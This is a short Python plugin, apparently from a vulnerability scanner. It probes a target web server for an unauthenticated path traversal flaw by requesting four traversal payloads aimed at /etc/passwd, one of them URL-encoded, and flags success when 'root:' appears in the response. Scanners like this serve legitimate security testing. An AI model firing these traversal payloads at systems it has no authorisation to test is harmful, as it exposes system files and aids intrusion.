# coding:utf-8
import requests
from config import HEADERS

plugin_info = {
    "name": "frv",
    "info": "frv，严重可导致服务器被入侵。",
    "level": "高危",
    "type": "未授权",
    "url": "",
    "vulinfo": "",
}

def get_plugin_info():
    return plugin_info


def check(webinfo,ip,port,domain,timeout):
    tempheasers = HEADERS

    if domain:
        tempheasers['Host'] = domain
    payloads = ['/static/../../../../../../etc/passwd',
                '/../../../../../../etc/passwd',
                '/uploadfile/../../../../../../etc/passwd',
                '/%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd']
    url = webinfo['scheme'] + ip + ':' + port
    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5, headers=tempheasers, verify=False)
            if 'root:' in r.text:
                plugin_info['vulinfo'] = 'frv   ' + payload
                return 1
        except:
            pass

    return 0